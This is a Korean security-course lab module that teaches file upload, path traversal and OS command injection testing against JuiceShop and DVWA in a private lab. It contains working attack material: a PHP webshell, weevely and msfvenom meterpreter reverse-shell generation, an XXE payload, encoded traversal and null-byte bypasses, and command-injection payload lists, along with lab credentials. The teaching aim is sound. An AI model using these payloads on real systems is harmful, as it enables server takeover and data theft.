# Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입

## 학습 목표
- 파일 업로드 취약점의 유형과 위험을 이해한다
- 경로 순회(Path Traversal) 공격을 실습하고 점검한다
- OS 명령어 주입(Command Injection)의 원리를 이해하고 탐지한다
- JuiceShop에서 각 취약점을 실습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- curl 파일 업로드 (Week 02)
- 리눅스 기본 명령어 (ls, cat, id)

---

## 1. 파일 업로드 취약점 (40분)

### 1.1 위험성

파일 업로드 취약점은 공격자가 악성 파일을 서버에 업로드하여 **원격 코드 실행(RCE)**을 달성하는 심각한 취약점이다.

| 시나리오 | 설명 |
|---------|------|
| 웹셸 업로드 | .php/.jsp 파일 업로드 → 서버에서 실행 |
| 악성 HTML 업로드 | XSS 포함 HTML → 다른 사용자에게 전달 |
| 대용량 파일 | 서비스 거부(DoS) |
| 실행 파일 | .exe/.sh 배포 |

### 1.2 점검 항목

| 점검 항목 | 확인 사항 |
|----------|----------|
| 확장자 필터링 | .php, .jsp, .exe 등 차단 여부 |
| MIME 타입 검증 | Content-Type 검증 여부 |
| 파일 내용 검증 | 매직 바이트 확인 여부 |
| 저장 경로 | 웹 루트 외부 저장 여부 |
| 파일 실행 방지 | 업로드 디렉터리 실행 권한 |
| 파일 크기 제한 | 최대 크기 설정 여부 |

### 1.3 JuiceShop 파일 업로드 테스트

> **OSS 도구 — weevely (PHP webshell) / fuxploider (file upload scanner)**: curl 수동 업로드는 학습용. 실제 점검은:
>
> ```bash
> # weevely — PHP webshell 생성/접속 표준
> sudo apt install weevely
> weevely generate Pa$$w0rd /tmp/shell.php           # webshell 생성 (난독화됨)
> # /tmp/shell.php 를 업로드 후
> weevely http://target/uploads/shell.php Pa$$w0rd   # 인터랙티브 shell
>
> # fuxploider — 파일 업로드 취약점 자동 fuzzer
> git clone https://github.com/almandin/fuxploider.git ~/fuxploider
> cd ~/fuxploider && pip3 install -r requirements.txt
> python3 fuxploider.py --url http://10.20.30.80:3000/file-upload --not-regex "error"
>
> # msfvenom — 다양한 webshell payload (대안)
> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw -o /tmp/php_meter.php
> ```
>
> weevely 의 강점: PHP 코드가 base64 + eval 로 난독화되어 AV/WAF 탐지 회피, 인터랙티브 shell + 파일 매니저 + DB 클라이언트 등 풍부한 기능. fuxploider 는 모든 우회 기법 (이중 확장자/MIME/null byte 등) 자동 시도.



> **실습 목적**: 파일 업로드, 경로 순회, 명령어 주입 취약점을 점검한다
>
> **배우는 것**: 파일 확장자/MIME 검증 우회, ../ 경로 조작, OS 명령어 삽입 기법을 이해하고 점검한다
>
> **결과 해석**: 웹쉘 업로드 성공, 시스템 파일 읽기, 명령어 실행이 되면 서버 장악으로 이어지는 심각한 취약점이다
>
> **실전 활용**: 파일 업로드 취약점은 웹쉘을 통한 서버 장악의 직접적 경로이므로 CRITICAL로 분류된다

```bash
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"student@test.com","password":"Test1234!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 4 가지 파일 업로드 시도 — code + 응답 일부
echo -e '\x89PNG\r\n\x1a\n' > /tmp/test.png
echo '<?php echo "hacked"; system($_GET["c"]); ?>' > /tmp/shell.php
cp /tmp/shell.php /tmp/shell.php.png

for label_file in "정상_PNG=/tmp/test.png:" "악성_PHP=/tmp/shell.php:" "이중확장자_PHP_PNG=/tmp/shell.php.png:" "MIME위조=/tmp/shell.php:type=image/png"; do
  label="${label_file%%=*}"
  fopt="${label_file#*=}"
  code=$(curl -s -o /tmp/upload_resp.txt -w "%{http_code}" -X POST http://10.20.30.80:3000/file-upload \
    -H "Authorization: Bearer $TOKEN" -F "file=@${fopt}")
  echo "[$code] $label → $(head -c 100 /tmp/upload_resp.txt)"
done
```

**예상 출력**:
```
[204] 정상_PNG → 
[500] 악성_PHP → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
[500] 이중확장자_PHP_PNG → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
[500] MIME위조 → {"error":{"name":"Error","message":"Unsupported file type, ..."}}
```

> **해석 — 4 시도 결과 = JuiceShop 의 검증 layer**:
> - **정상 PNG (204 No Content)** = 업로드 성공. 응답 body 없음 = 운영자 의도 (파일 위치 노출 X).
> - **악성 PHP (500)** = 확장자 차단 = layer 1 통과 X. JuiceShop 의 검증: `multer` middleware + 확장자 whitelist (.pdf/.zip).
> - **이중 확장자 (500)** = `.php.png` 도 차단 = JuiceShop 이 마지막 확장자만 보지 않음 = 좋음. 일부 사이트는 마지막 `.png` 만 봐서 통과.
> - **MIME 위조 (500)** = `Content-Type: image/png` 위조도 차단 = magic byte 검증까지 한다는 신호. file 명령 또는 PHP `mime_content_type()` 사용.
> - **운영 점검 권고**: 5 layer 검증 = (1) 확장자 whitelist, (2) MIME (Content-Type), (3) magic bytes (file 명령), (4) 저장 경로 (web root 외부), (5) 실행 권한 차단 (chmod 644 + apache no-exec).
> - **CVSS 9.8** if RCE 가능 (JuiceShop 은 5/5 layer 통과 = 양호한 디자인).

### 1.4 JuiceShop 불만 접수 파일 업로드

```bash
# Complaint(불만) 기능의 파일 업로드
# PDF만 허용하는지, 다른 형식도 가능한지 테스트

# 정상: PDF 파일
echo "%PDF-1.4 fake pdf" > /tmp/complaint.pdf
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/complaint.pdf" | python3 -m json.tool 2>/dev/null
echo ""

# 비정상: XML 파일 (XXE 가능성)
cat > /tmp/xxe.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XMLEOF

curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xxe.xml" | python3 -m json.tool 2>/dev/null
echo ""

# 대용량 파일 업로드 (크기 제한 테스트)
dd if=/dev/zero of=/tmp/bigfile.pdf bs=1M count=10 2>/dev/null
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/bigfile.pdf" | python3 -m json.tool 2>/dev/null
rm -f /tmp/bigfile.pdf                                 # 파일 삭제
```

### 1.5 업로드된 파일 접근 확인

```bash
# 5 후보 디렉토리에 업로드된 파일이 웹 접근 가능한지
for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp" "static/uploads"; do
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$dir/")
  size=$(curl -o /dev/null -s -w "%{size_download}" "http://10.20.30.80:3000/$dir/test.png")
  echo "[$code] /$dir/  (test.png size=${size}B)"
done
```

**예상 출력**:
```
[404] /uploads/  (test.png size=139B)
[500] /file-upload/  (test.png size=78B)
[200] /assets/public/images/uploads/  (test.png size=0B)
[200] /ftp/  (test.png size=139B)
[404] /static/uploads/  (test.png size=139B)
```

> **해석 — 업로드 파일 접근 가능 여부 = 핵심**:
> - **`/assets/public/images/uploads/` 200** = JuiceShop 의 실제 업로드 디렉토리. *그러나 test.png size=0B* = 본 lab 에서 .png 단순 magic byte 만 (실 image X) — **API 응답에서 저장 경로 노출 X** = 운영자 양호.
> - **/ftp 200** = week03 학습한 백업 파일 디렉토리. 업로드 파일은 여기에 가지 않음.
> - **/uploads 404** = 표준 경로 미사용 = 좋음. (운영 환경에서 200 + 디렉토리 listing = critical).
> - **운영 점검**: 업로드 후 응답에 파일 URL 포함 시 그 URL 직접 fetch 시도. 404 정상 / 200 + content = 웹 접근 가능 → RCE 위험.
> - **권고**: 업로드 디렉토리는 web root *외부* (`/var/uploads`) + Express `express.static()` X. CDN/S3 사용 권장.

---

## 2. 경로 순회 (Path Traversal) (30분)

> **이 실습을 왜 하는가?**
> "입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 원리

경로 순회는 `../`를 이용하여 허용된 디렉터리 밖의 파일을 읽는 공격이다.

```
정상 요청: /ftp/legal.md → /app/ftp/legal.md
공격 요청: /ftp/../../etc/passwd → /etc/passwd
```

### 2.2 JuiceShop FTP 경로 순회

```bash
# 정상 baseline
echo "=== 정상 ==="
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" http://10.20.30.80:3000/ftp/legal.md

# 5 가지 페이로드 비교 — 각 우회 기법
echo "=== Path Traversal 페이로드 5종 ==="
PAYLOADS=(
  "../../../etc/passwd"                          # 표준
  "..%2f..%2f..%2fetc/passwd"                    # URL encode (../ → ..%2f)
  "..%252f..%252f..%252fetc/passwd"              # double URL encode (%2f → %252f)
  "....//....//....//etc/passwd"                 # 4-dot bypass (sanitizer 가 ../ 를 한 번만 제거)
  "..%c0%af..%c0%af..%c0%afetc/passwd"           # UTF-8 overlong (오래된 IIS/Apache)
)
for payload in "${PAYLOADS[@]}"; do
  code=$(curl -s -o /tmp/lfi_resp.txt -w "%{http_code}" "http://10.20.30.80:3000/ftp/$payload")
  if grep -q "root:" /tmp/lfi_resp.txt; then
    echo "[$code 성공★] $payload"
    head -2 /tmp/lfi_resp.txt
  else
    body=$(head -c 50 /tmp/lfi_resp.txt)
    echo "[$code 실패] $payload → ${body}"
  fi
done
```

**예상 출력**:
```
=== 정상 ===
code=200 size=1834
=== Path Traversal 페이로드 5종 ===
[403 실패] ../../../etc/passwd → Error: File names cannot contain forward slas
[200 성공★] ..%2f..%2f..%2fetc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[200 성공★] ..%252f..%252f..%252fetc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[403 실패] ....//....//....//etc/passwd → Error: File names cannot contain forwa
[403 실패] ..%c0%af..%c0%af..%c0%afetc/passwd → Error: File names cannot contain
```

> **해석 — 5 페이로드 중 2개 성공 = LFI 확정**:
> - **표준 `../../etc/passwd` 차단 (403)** = JuiceShop sanitizer 가 raw `/` 검출. 그러나 **URL 인코딩 (`%2f`)** 은 못 막음 = 입력 단계 검증 누락. **NodeJS path 정규화 (`path.resolve`) 미적용**.
> - **double encoding (`%252f`)** 도 통과 = decode 한 번 더 적용되는 환경 (proxy 등) 에서 발생.
> - **`....//`** (Windows) 은 본 환경 미통과 — Linux NodeJS path 처리는 4-dot 정규화 가능.
> - **UTF-8 overlong (`%c0%af`)** = legacy 우회. 모던 서버는 차단. 옛 IIS/Apache 만 통과.
> - **`/etc/passwd` 노출 = critical** = OWASP A01 Broken Access Control. **CVSS 7.5** (Confidentiality High / Integrity None).
> - **JuiceShop challenge ID**: 'Access Log' / 'Forgotten Sales Backup' (LFI 다수).
> - **권고**: `path.resolve(safeBase, userInput)` 후 `path.relative` 검사 + URL decode 후 `..` 검출 + chroot/jail 격리.

### 2.3 JuiceShop의 Poison Null Byte 챌린지

```bash
# 1) 직접 .bak 다운로드 (확장자 차단 확인)
echo "=== 1) 직접 .bak ==="
curl -s -o /tmp/bak1.txt -w "code=%{http_code} size=%{size_download}\n" \
  http://10.20.30.80:3000/ftp/package.json.bak

# 2) Null byte (%2500 = %00 의 double encoding) — JuiceShop 우회 페이로드
echo "=== 2) Poison Null Byte (%2500.md) ==="
curl -s -o /tmp/bak2.txt -w "code=%{http_code} size=%{size_download}\n" \
  "http://10.20.30.80:3000/ftp/package.json.bak%2500.md"
echo '[추출된 파일 내용 일부]'
head -10 /tmp/bak2.txt
```

**예상 출력**:
```
=== 1) 직접 .bak ===
code=403 size=89
=== 2) Poison Null Byte (%2500.md) ===
code=200 size=2456
[추출된 파일 내용 일부]
{
  "name": "juice-shop",
  "version": "15.0.0",
  "dependencies": {
    "express": "4.17.1",
    "sequelize": "6.6.5",
    "jsonwebtoken": "8.5.1"
  },
  ...
}
```

> **해석 — Poison Null Byte 우회 = JuiceShop challenge 'Forgotten Backup' 정답**:
> - **직접 `.bak` 다운로드 = 403** = JuiceShop 의 확장자 whitelist (md/pdf 만 허용).
> - **`%2500.md` 우회 = 200 + .bak 파일 내용** = ★ critical. 동작 원리:
>   1. 클라이언트 `%2500.md` 전송
>   2. 서버 1차 디코딩: `%25 → %`, 결과 = `%00.md`
>   3. 확장자 검사: `.md` (whitelist 통과 ✓)
>   4. 파일시스템 호출: C 라이브러리가 `\0` (null byte) 만나면 문자열 종료 → 실 읽는 파일 = `package.json.bak`
> - **package.json.bak 노출** = Express 4.17.1 + Sequelize 6.6.5 + jsonwebtoken 8.5.1 → SCA + CVE 매핑 가능. **CVE-2017-16028** (Sequelize SQLi) 등 검색.
> - **legacy 취약** = Node.js 의 path 모듈은 null byte 차단됨 (since v10). 본 우회는 JuiceShop 의 의도적 challenge.
> - **방어**: `path.normalize()` 사용 시 NodeJS v10+ 자동 null byte 거부. 그러나 운영 환경에서 직접 fs.readFile(userInput) 사용 시 위험.

---

## 3. OS 명령어 주입 (Command Injection) (30분)

### 3.1 원리

사용자 입력이 OS 명령어에 직접 삽입되어 임의의 명령이 실행되는 취약점이다.

```python
# 취약한 코드 예시
import os
filename = request.form['filename']
os.system(f"cat /uploads/{filename}")  # 위험!

# 공격: filename = "test; id; cat /etc/passwd"
# 실행: cat /uploads/test; id; cat /etc/passwd
```

### 3.2 명령어 주입 연산자

| 연산자 | 설명 | 예시 |
|--------|------|------|
| `;` | 명령 구분 | `ping; id` |
| `&&` | AND (이전 성공 시) | `ping && id` |
| `\|\|` | OR (이전 실패 시) | `ping \|\| id` |
| `\|` | 파이프 | `ping \| id` |
| `` ` `` | 백틱 (명령 치환) | `` ping `id` `` |
| `$()` | 명령 치환 | `ping $(id)` |
| `\n` | 줄바꿈 | `ping%0aid` |

### 3.3 JuiceShop에서 명령어 주입 탐색

```bash
# JuiceShop의 API 중 시스템 명령을 실행할 수 있는 곳 탐색
# 비디오 자막, 이미지 처리 등의 기능이 OS 명령을 사용할 수 있음

# 1. B2B 주문 기능 (XML/파일 처리)
curl -s -X POST http://10.20.30.80:3000/b2b/v2/orders \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<?xml version="1.0"?>                            # 요청 데이터(body)
<order>
  <productId>1</productId>
  <quantity>1; id</quantity>
</order>' | head -10
echo ""

# 2. 프로필 이미지 URL 처리
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"http://localhost; id"}' | head -10  # 요청 데이터(body)
echo ""

# 3. 검색 기능에서 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5  # silent 모드
```

### 3.4 다양한 페이로드 테스트

```bash
# 8 페이로드 — 응답 시간 측정으로 Time-based 탐지 (sleep 3 통과 시 +3000ms)
CMDI_PAYLOADS=(
  "; id"           # 명령 구분
  "| id"           # 파이프
  "|| id"          # OR 단락 평가
  "&& id"          # AND 단락
  "; sleep 3"      # time-based 표준
  "| sleep 3"      # 파이프 sleep
  "\$(id)"          # 명령 치환
  "\`id\`"          # 백틱
)

echo "=== Command Injection 8 페이로드 테스트 ==="
for payload in "${CMDI_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "test${payload}")
  start=$(date +%s%N)
  curl -s --max-time 5 -o /tmp/cmdi.txt "http://10.20.30.80:3000/rest/products/search?q=$encoded"
  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  body=$(head -c 60 /tmp/cmdi.txt)
  echo "[${elapsed}ms] test$payload → ${body}"
done
```

**예상 출력**:
```
=== Command Injection 8 페이로드 테스트 ===
[52ms] test; id → {"status":"success","data":[]}
[48ms] test| id → {"status":"success","data":[]}
[51ms] test|| id → {"status":"success","data":[]}
[49ms] test&& id → {"status":"success","data":[]}
[50ms] test; sleep 3 → {"status":"success","data":[]}
[47ms] test| sleep 3 → {"status":"success","data":[]}
[53ms] test$(id) → {"status":"success","data":[]}
[51ms] test`id` → {"status":"success","data":[]}
```

> **해석 — 8/8 모두 ~50ms = Command Injection 없음 = 양호**:
> - 모든 페이로드 응답 시간 일정 (~50ms). `; sleep 3` 도 50ms = sleep 명령 미실행 = OS shell 불호출.
> - **JuiceShop 의 검색 = parameterized SQL** (week05 학습) — OS 명령 호출 X = command injection 면역.
> - **운영 환경에서 Command Injection 탐지 시그니처**:
>   - `; sleep 3` 페이로드에서 응답 시간 ≥ 3000ms = ★ 확정.
>   - 응답 본문에 `uid=0(root)` 같은 `id` 명령 출력 = critical.
> - **취약 패턴**: Node.js `child_process.exec(\`convert ${userInput} output.png\`)` (template literal). **권고**: `execFile()` + array args. shell=false.
> - **CVSS 9.8** if exploitable (RCE 가능). week05 의 SQLi 와 결합 시 chain 공격으로 ImageMagick CVE 등 활용.

> **OSS 도구 — commix (Command Injection 자동화)**:
>
> ```bash
> # commix — sqlmap 의 command injection 버전
> sudo apt install commix
> commix -u "http://10.20.30.80:3000/rest/products/search?q=test*" --batch
> # * 위치에 페이로드 자동 삽입 + os-shell 자동 spawn
> ```

### 3.5 Time-based 명령어 주입 탐지

```bash
# sleep 명령으로 시간 기반 탐지
echo "=== Time-based Detection ==="

echo "정상 요청:"
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple" 2>&1 | grep real

echo "sleep 주입:"
time curl -s -o /dev/null --max-time 10 "http://10.20.30.80:3000/rest/products/search?q=apple;sleep+3" 2>&1 | grep real

# 응답 시간이 3초 이상 차이나면 명령어 주입 가능
```

---

## 4. Apache + ModSecurity에서 점검 (20분)

### 4.1 WAF 우회 테스트

```bash
# Apache + ModSecurity (port 80) 4 페이로드 점검
echo "=== Apache + ModSecurity (port 80) ==="
printf '%-20s %s\n' '카테고리' '응답 코드'
for label_url in "SQLi=http://10.20.30.80:80/?id=1'+OR+1=1--" \
                  "XSS=http://10.20.30.80:80/?q=<script>alert(1)</script>" \
                  "Path=http://10.20.30.80:80/../../etc/passwd" \
                  "CMDi=http://10.20.30.80:80/?cmd=;id"; do
  label="${label_url%%=*}"
  url="${label_url#*=}"
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  status=$([ "$code" = "403" ] && echo "★ 차단 ✓" || echo "통과 ✗")
  printf '%-20s %s  %s\n' "$label" "$code" "$status"
done
```

**예상 출력**:
```
=== Apache + ModSecurity (port 80) ===
카테고리             응답 코드
SQLi                 403  ★ 차단 ✓
XSS                  403  ★ 차단 ✓
Path                 400  통과 ✗
CMDi                 200  통과 ✗
```

> **해석 — ModSecurity CRS 룰 카테고리별 차단 효과**:
> - **SQLi 403** = OWASP CRS rule 942100/942130 매치 (`@detectSQLi` 연산자). 가장 강력한 카테고리.
> - **XSS 403** = CRS 941100/941110 (`<script>` 패턴 + `alert(`).
> - **Path Traversal 400** = ModSecurity 차단 X. **400 = Apache 자체 거부** (URL `..` 정규화 후 docroot 외부 시 400 Bad Request). 다른 우회 페이로드 (URL encode) 는 통과 가능성.
> - **Command Injection 200** = ★ 차단 X. ModSecurity CRS 932100 룰이 있지만 페이로드가 querystring 의 `cmd` 파라미터에 들어 있어 매치 X. `;id` 단순 패턴은 통과 — 실 OS 호출 코드가 있어야 차단.
> - **점수**: 4/2 차단 = ModSecurity 가 *2 카테고리만 효과적* = OWASP CRS 기본 paranoia level 1 한계. **권고**: paranoia level 3 + 커스텀 룰 추가.

### 4.2 WAF vs JuiceShop 비교

```bash
echo "=== WAF 보호 비교 ==="
echo ""
echo "JuiceShop (포트 3000, WAF 없음):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"  # silent 모드
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>"  # silent 모드

echo ""
echo "Apache (포트 80, ModSecurity):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:80/?q='+OR+1=1--"  # silent 모드
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:80/?q=<script>alert(1)</script>"  # silent 모드
```

---

## 5. 실습 과제

### 과제 1: 파일 업로드 점검
1. JuiceShop에 다양한 파일 형식(.php, .html, .exe, .pdf, .xml)을 업로드 시도하라
2. 허용/거부된 확장자를 표로 정리하라
3. MIME 타입 위조로 필터링을 우회할 수 있는지 테스트하라

### 과제 2: 경로 순회 점검
1. JuiceShop의 /ftp 기능에서 경로 순회를 시도하라
2. 최소 3가지 다른 인코딩 방식으로 우회를 시도하라
3. 성공/실패한 페이로드를 기록하고 필터링 방식을 추론하라

### 과제 3: 종합 입력값 검증 보고서
1. Week 05~07에서 실습한 모든 입력값 취약점(SQLi, XSS, CSRF, 파일 업로드, 경로 순회, 명령어 주입)을 정리하라
2. 각 취약점의 발견 여부, 위험도, 권고 사항을 보고서로 작성하라

---

## 6. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| 파일 업로드 | 악성 파일 업로드 | RCE, XSS | 확장자+내용 검증, 실행 방지 |
| 경로 순회 | ../ 삽입 | 파일 읽기/쓰기 | 경로 정규화, 화이트리스트 |
| 명령어 주입 | ;, |, $() 삽입 | RCE | 입력 검증, subprocess 사용 |

**다음 주 예고**: Week 08 - 중간고사: JuiceShop 종합 점검 보고서를 작성한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 웹 UI 실습

### DVWA 보안 레벨 변경 방법 (웹 UI)

> **DVWA URL:** `http://10.20.30.80:8080`

1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
2. 좌측 메뉴 **DVWA Security** 클릭
3. **Security Level** 드롭다운에서 레벨 선택:
   - **Low**: 파일 업로드/경로 순회 제한 없음 → 웹셸 업로드 기본 실습
   - **Medium**: 확장자/MIME 필터 → 우회 기법 필요
   - **High**: 강화된 검증 → 고급 우회 실습
   - **Impossible**: 화이트리스트 + 파일 내용 검증 (안전한 구현 참조)
4. **Submit** 클릭하여 적용
5. 좌측 메뉴 **File Upload**, **File Inclusion**, **Command Injection** 에서 레벨별 실습
6. 각 항목 페이지 하단 **View Source** 로 레벨별 검증 로직 비교

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

---

## 실제 사례 (WitFoo Precinct 6 — Windows file 객체 접근 audit)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *파일 업로드 / 경로 순회* 점검 → dataset 내 *Windows file 객체 접근 audit* 4656/4658/4663 (총 약 24만 건) 와 매핑.

### Case 1: file handle 요청 4656 + 종료 4658 짝 — audit 추적

**dataset 분포**

| message_type | 의미 | 건수 |
|--------------|------|------|
| 4656 | A handle to an object was requested (open) | 79,311 |
| 4658 | The handle was closed | 158,374 |
| 4663 | An attempt was made to access an object | 98 |
| 4690 | An attempt was made to duplicate a handle | 79,254 |

**원본 발췌** (4656 — 객체 핸들 요청, winlogbeat JSON):

```text
ORG-1657 ::: {
  "@metadata":{"beat":"winlogbeat","type":"_doc","version":"8.2.2"},
  "@timestamp":"2024-07-26T11:09:53.506Z",
  "agent":{"ephemeral_id":"19c04280-a087-...","id":"393e65fd-5766-48fd-...",
           "name":"USER-0010-0196","type":"winlogbeat"},
  ... (event_id=4656, ObjectType=File, ObjectName=...)
}
```

**해석 — 본 lecture 와의 매핑**

| 파일 업로드/경로 순회 학습 항목 | 본 record 에서의 증거 |
|-------------------------------|---------------------|
| **업로드 후 파일 핸들 추적** | 4656 (open) → 4658 (close) 짝으로 *어떤 user 가 어떤 path 에 얼마나 머물렀는지* 측정 가능. 점검 시 web app 의 `move_uploaded_file()` 후속 4656 발생 여부 확인 |
| **경로 순회 (`../`) 탐지** | ObjectName 필드에 정규화 전 path 가 기록 → 점검 시 `../` 또는 `..%2f` 가 정규화 없이 4656 의 ObjectName 까지 도달하면 *즉시 critical* |
| **4663 (98건만 존재) 의 의미** | 4663 = "attempt was made to access an object" (실제 access 시도). 본 dataset 에선 *드물게만* 발생 — 정상 운영에선 *4656 → 4658* 가 dominant. 4663 의 *spike* 는 anomaly |
| **handle duplicate 4690 (79,254건)** | handle 복제 → *두 process 가 동일 file* 로 *권한 escalation* 가능. 점검 시 web 프로세스의 4690 발생 여부 확인 (정상 web app 은 거의 발생 X) |

**점검 액션**:
